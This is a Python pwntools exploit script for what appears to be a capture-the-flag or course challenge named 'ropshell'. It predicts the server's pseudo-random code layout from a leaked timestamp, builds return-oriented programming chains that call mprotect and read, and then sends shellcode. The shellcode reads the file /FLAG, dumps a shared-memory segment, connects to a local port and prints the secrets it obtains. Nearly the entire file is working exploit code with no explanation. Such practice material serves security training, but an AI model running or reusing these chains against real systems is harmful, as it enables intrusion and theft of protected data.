#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
import ctypes
import subprocess
libc = ctypes.CDLL('libc.so.6')

context.arch = 'amd64'
context.os = 'linux'

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

context.arch = 'amd64'

s = r.recvuntil("second(s)").decode().split()
print("s", s)
timestamp = int(s[s.index("is") + 1])
code_loc = int(s[s.index("at") + 1], 0)
print("timestamp",timestamp, type(timestamp))

LEN_CODE = 10*0x10000
codecontent = []
libc.srand(timestamp)

for i in range(int(LEN_CODE/4)):
    
    temp = (libc.rand()<<16) | (libc.rand() & 0xffff);
    temp &= 0xffffffff
    codecontent.append(temp)
codecontent[libc.rand() % (int(LEN_CODE/4) - 1)] = 0xc3050f
code_bytes = b''
for single_int in codecontent:
    bytes_arr = single_int.to_bytes(4, byteorder='little')
    code_bytes += bytes_arr
    

print("code loc", (code_loc), hex(code_loc))
#exit(37)
buf = b''.join([p64(code_loc + code_bytes.find(asm("""
                    pop rax
                    ret
                    """))),p64(60),
       p64(code_loc + code_bytes.find(asm("""
                      pop rdi
                      ret
                      """))), p64(37),
       p64(code_loc + code_bytes.find(asm("""
                      syscall
                      ret
                      """)))]
       
       )
r.send(buf)
# change mprotect + read code from stdin
buf = b''.join([p64(code_loc + code_bytes.find(asm("""
                    pop rax
                    ret
                    """))),p64(10),
       p64(code_loc + code_bytes.find(asm("""
                      pop rdi
                      ret
                      """))), p64(code_loc),
       p64(code_loc + code_bytes.find(asm("""
                      pop rsi
                      ret
                      """))), p64(LEN_CODE),
       p64(code_loc + code_bytes.find(asm("""
                      pop rdx
                      ret
                      """))), p64(7),
       p64(code_loc + code_bytes.find(asm("""
                      syscall
                      ret
                      """))),
       p64(code_loc + code_bytes.find(asm("""
                    pop rax
                    ret
                    """))),p64(0),
       p64(code_loc + code_bytes.find(asm("""
                      pop rdi
                      ret
                      """))), p64(0),
       p64(code_loc + code_bytes.find(asm("""
                      pop rsi
                      ret
                      """))), p64(code_loc),
       p64(code_loc + code_bytes.find(asm("""
                      pop rdx
                      ret
                      """))), p64(LEN_CODE),
       p64(code_loc + code_bytes.find(asm("""
                      syscall
                      ret
                      """))), p64(code_loc)
       ])
r.send(buf)

asm_code = "mov rax, 0\nmov rdi, 0\nmov rsi, " + hex(code_loc) + "\nmov rdx, 6\nsyscall\n"+ "mov rax, 2\nmov rdi, " + hex(code_loc) + "\nmov rsi, 0\nsyscall\n" + "mov rdi, rax\nmov rax, 0\nmov rsi, " + hex(code_loc+0x6) + "\nmov rdx, 0x400\nsyscall\nmov rax, 1\nmov rdi, 1\nmov rsi," + hex(code_loc+0x6) +" \nmov rdx, 0x43\nsyscall\n" + "mov rax, 0x1d\nmov rdi, 0x1337\nmov rsi, 0x1000\nmov rdx, 0\nsyscall\nmov rdi, rax\nmov rsi, 0\nmov rdx, 0x1000\nmov rax, 0x1e\nsyscall\n" + "mov r10, rax\n"+shellcraft.amd64.strlen('rax')+"mov rdi, 1\nmov rsi, r10\nmov rdx, rcx\nmov rax, 1\nsyscall\n"
#socket(2, 1, 0)
asm_code += "mov rdi, 2\n"
asm_code += "mov rsi, 1\n"
asm_code += "mov rdx, 0\n"
asm_code += "mov rax, 41\n"
asm_code += "syscall\n"

asm_code += "mov r8, rax\n" # r8 = sockfd
asm_code += "mov r9, " + hex(code_loc) + "\n"

#connect(r8, [r9 + 0x100], 16)
asm_code += "mov WORD PTR [r9 + 0x100], 2\n" # AF_INET
asm_code += "mov WORD PTR [r9 + 0x102], 0x3713\n" # port = 0x1337
asm_code += "mov DWORD PTR [r9 + 0x104], 0x100007f\n" # 127.0.0.1
asm_code += "mov rdi, r8\n" # sockfd
asm_code += "lea rsi, [r9 + 0x100]\n" # sockaddr
asm_code += "mov rdx, 16\n" #socklen
asm_code += "mov rax, 42\n"
asm_code += "syscall\n"

# read(sockfd, [r9 + 0x200], 1000)
asm_code += "mov rdi, r8\n"
asm_code += "lea rsi, [r9 + 0x200]\n"
asm_code += "mov rdx, 1000\n"
asm_code += "mov rax, 0\n"
asm_code += "syscall\n"

# write(1, [r9+0x200], 0x43)
asm_code += "mov rdi, 1\n"
asm_code += "lea rsi, [r9 + 0x200]\n"
asm_code += "mov rdx, 0x43\n"
asm_code += "mov rax, 1\n"
asm_code += "syscall\n"

asm_code += "mov rax, 60\nmov rdi, 0\n syscall\n"
r.send(asm(asm_code))

r.send("/FLAG")
# r.send("127.0.0.1")
r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
